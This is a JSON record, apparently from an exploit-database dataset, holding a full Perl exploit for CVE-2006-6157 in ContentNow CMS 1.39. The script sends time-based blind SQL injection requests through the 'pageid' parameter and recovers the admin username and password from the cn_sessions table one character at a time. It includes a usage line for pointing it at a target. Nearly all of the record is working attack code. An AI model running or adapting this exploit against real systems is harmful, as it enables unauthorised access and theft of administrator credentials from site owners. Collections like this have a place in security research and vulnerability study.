{
  "id": "2822",
  "title": "ContentNow 1.39 - &#039;pageid&#039; SQL Injection",
  "cve": "CVE-2006-6157",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\nuse IO::Socket;\r\nuse strict;\r\n\r\n#   ContentNow \"pageid\" Sql Injection\r\n# Version  : 1.39\r\n#     Url  : http://www.contentnow.mf4k.de\r\n# Author   : Alfredo 'revenge' Pesoli\r\n# Advisory : http://www.0xcafebabe.it/advisory/contentnow_139_sqlinjection.txt \r\n#\r\n# Description:\r\n#\r\n# The \"pageid\" parameter isn't properly sanitised before being returned in sql query\r\n# and can be used to inject craft SQL queries, we can use Blind SQL Injection attack\r\n# to disclose admin credential.\r\n#\r\n# Works regardless of magic quotes\r\n# \r\n# http://www.0xcafebabe.it\r\n# <revenge@0xcafebabe.it>\r\n\r\nif (@ARGV < 2) { &usage; }\r\n\r\nmy $delay\t= \"1500000\";\r\nmy $host        = $ARGV[0];\r\nmy $dir         = $ARGV[1];\r\nif ($ARGV[2] ) { $delay = $ARGV[2]; }\r\n\r\nprint \"\\nTarget url : \".$host.$dir.\"\\n\\n\";\r\n$host =~ s/(http:\\/\\/)//;\r\n\r\nmy @array = (\"user\",\"password\");\r\n\r\nprint \"--== Trying to perform sql injection ==--\\n\\n\";\r\nsleep(1);\r\n\r\n&sploit();\r\n\r\nsub sploit() {\r\n\tmy $x \t\t= \"\";\r\n\tmy $i\t\t= \"\";\r\n\tmy $string\t= \"\";\r\n\tmy $res\t\t= \"1\";\r\n\t\r\n\tfor ( $x=0; $x<=$#array; $x++ ) {\r\n\t\tmy $j = 1;\r\n\t\t$res  = 1;\r\n\t\twhile ($res) {\r\n\t\t\tfor ($i=32;$i<=127;$i++) {\r\n\t\t\t\t$res = 0;\r\n\t\t\t\t\r\n\t\t\t\tif ( $x eq 1 ) {\r\n\t\t\t\t\tnext if ( $i < 48 );\r\n\t\t\t\t\tnext if ( ( $i > 57 ) and ( $i < 97 ) );\r\n\t\t\t\t\tnext if ( $i > 102 );\r\n\t\t\t\t}\r\n\r\n\t\t\t\tmy $val  = \"index.php?\";\r\n\r\n\t\t\t\t$val .= \"pageid=(select(if((ascii(substring($array[$x],$j,1))=$i),benchmark(\".$delay.\",sha1(13)),0))/**/from/**/cn_sessions/**/where/**/id=1/**/limit/**/1)\";\r\n\t\t\t\tmy $data=$dir.$val;\r\n\t\t\t\tmy $start = time();\r\n\t\r\n\t\t\t\tmy $req = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"Error - connection failed\\n\\n\";\r\n\t\t\t\tprint $req \"GET $data HTTP/1.1\\r\\n\";\r\n\t\t\t\tprint $req \"Host: $host\\r\\n\";\r\n\t\t\t\tprint $req \"User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6 (GNU Linux)\\r\\n\";\r\n\t\t\t\tprint $req \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\\r\\n\";\r\n\t\t\t\tprint $req \"Accept-Language: en-us;q=0.7,en;q=0.3\\r\\n\";\r\n\t\t\t\tprint $req \"Accept-Encoding: gzip,deflate\\r\\n\";\r\n\t\t\t\tprint $req \"Keep-Alive: 300\\r\\n\";\r\n\t\t\t\tprint $req \"Connection: Keep-Alive\\r\\n\";\r\n\t\t\t\tprint $req \"Cache-Control: no-cache\\r\\n\";\r\n\t\t\t\tprint $req \"Connection: close\\r\\n\\r\\n\";\r\n\t\t\t\t\r\n\t\t\t\twhile (my $result = <$req>) {\r\n\t\t\t\t\tif ( $result =~ /404 Not Found/ ) {\r\n\t\t\t\t\t\tprintf \"\\n\\nFile not found.\\n\\n\";\r\n\t\t\t\t\t\tprint \"\\n\\n$result\\n\\n\";\r\n\t\t\t\t\t\texit;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tif ( $result =~ /400 Bad Request/ ) {\r\n\t\t\t\t\t\tprintf \"\\n\\nBad request.\\n\\n\";\r\n\t\t\t\t\t\tprint \"\\n\\n$result\\n\\n\";\r\n\t\t\t\t\t\texit;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\tmy $end = time();\r\n\t\t\t\tmy $dft = $end - $start;\r\n\t\t\t\t\r\n\t\t\t\tif ( $dft > 4 ) {\r\n\t\t\t\t\t$string .= chr($i);\r\n\t\t\t\t\tprint \"\\n\\tFound : \".chr($i).\"\\n\\n\";\r\n\t\t\t\t\t$res = 1;\r\n\t\t\t\t\tlast;\r\n\t\t\t\t}\r\n\t\t\t\tprint \"\\tTrying : \".chr($i).\"\\n\";\r\n\t\t\t}\r\n\t\t\t$j++;\r\n\t\t\tif ( !$res ) {\r\n\t\t\t\t$array[$x] = $string;\r\n\t\t\t\t$string = \"\";\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tprint \"\\n----------------------\\n\";\r\n\tprint \"Admin username : $array[0]\\n\";\r\n\tprint \"Admin password : $array[1]\\n\\n\";\r\n}\r\n\r\nsub usage() {\r\n    print \"\\n ContentNow CMS 1.39 'pageid' SQL Injection Exploit (Admin credentials disclosure)\\n\";\r\n    print \" <revenge\\@0xcafebabe.it>\\n\";\r\n    print \" http://www.0xcafebabe.it\\n\\n\";\r\n    print \"Usage: $0 <target> <directory> [benchmark_delay]\\n\";\r\n    print \"Example: $0 127.0.0.1 /contentnow/ 2000000\\n\\n\";\r\n    exit();\r\n}\r\n\r\n# milw0rm.com [2006-11-21]",
  "url": "https://www.exploit-db.com/exploits/2822"
}